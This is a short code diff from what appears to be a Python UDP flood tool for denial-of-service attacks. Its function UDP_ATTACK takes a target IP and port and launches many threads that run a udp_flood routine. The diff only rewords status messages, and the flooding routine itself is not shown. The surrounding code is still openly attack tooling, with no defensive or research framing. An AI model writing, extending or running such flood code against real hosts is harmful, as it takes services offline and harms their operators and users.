@@ -34,7 +34,7 @@ def UDP_ATTACK(threads, attack_time, target):
 	target_ip = target.split(":")[0]
 	target_port = int(target.split(":")[1])
 
-	print("\033[1;34m"+"[*]"+"\033[0m"+" Starting attack...")
+	print("\033[1;34m"+"[*]"+"\033[0m"+" Starting UDP attack...")
 	
 
 	threads_list = []
@@ -59,7 +59,7 @@ def UDP_ATTACK(threads, attack_time, target):
 
 	# Start threads
 	for thread in range(threads):
-		print("\033[1;34m"+"[*]"+"\033[0m"+" Staring thread " + str(thread)+"...")
+		print("\033[1;34m"+"[*]"+"\033[0m"+" Staring thread " + str(thread)+ "...")
 		t = Thread(target = udp_flood)
 		t.start()
 		threads_list.append(t)
